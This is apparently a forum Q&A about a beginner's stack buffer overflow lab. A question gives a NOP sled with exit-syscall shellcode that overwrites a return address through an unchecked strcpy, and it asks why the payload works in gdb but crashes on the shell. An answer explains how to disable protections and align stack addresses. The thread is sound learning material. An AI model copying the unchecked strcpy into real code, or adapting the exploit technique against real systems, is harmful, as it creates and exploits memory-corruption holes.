  "content": "So I just started with reverse engineering and have run into some issues until I recently noticed something strange. I wrote an extremely simple shellcode (exit system call) for practice and I played around with it in gdb. I use the following code to create my payload:\n\n```\n$(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n\n```\nI run this payload against the following program:\n\n```\n#include <string.h>\n\nint main(int argc, char **argv)\n{\n  char buffer[500];\n  strcpy(buffer, argv[1]);\n}\n\n```\nI compiled the program with: \n\n```\ntcc -m32 -mtune=i386 -g vuln.c -fno-stack-protector\n\n```\nNow, here's my problem. When I run the payload against the program in gdb like this, it works perfectly.\n\n```\n(gdb) r $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nStarting program: /root/exploiting/a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\n[Inferior 1 (process 2573) exited normally]\n(gdb\n\n```\nHowever, if I run it on my command line:\n\n```\nroot@kali:~/exploiting# ./a.out $(python -c 'print \"\\x90\" * 498 + \"\\x31\\xdb\\xb0\\x01\\xcd\\x80\" + \"\\x2c\\xd1\\xff\\xff\"')\nSegmentation fault\n\n```\nWhy does this happen? Is this supposed to happen?\n\n",

      "content": "look this is my solution just worked fine for me\nyou add two lines for c code to just check if the esp is same as esp you found it in gdb:\n\n```\n$ vi esp.c\n\n```\n```\n    #include <string.h>\n    #include <stdio.h>\n    void main(int argc, char *argv[]) {\n            char buffer[100];\n            strcpy(buffer, argv[1]);\n            register int i asm(\"esp\"); //add this line \n            printf(\"$esp = %#010x  \n\", i); // and this line will print esp\n            printf(\"Done!  \n\");\n    }\n\n```\nafter saving file \ncompile it with gcc and prevent all security levels:\n\n```\n$ gcc esp.c -o esp -fno-stack-protector -no-pie -z norelro -z execstack\n\n```\nyou change padding length until you find same esp you got it from gdb:\n\n```\n./esp $(python -c \"print 'gdb_eip'+96*'A'\")\n\n```\nand now after you find fine exploit in gdb \ngo and change payload until esp = gdb esp\nchange padding until you find same esp\n\n",
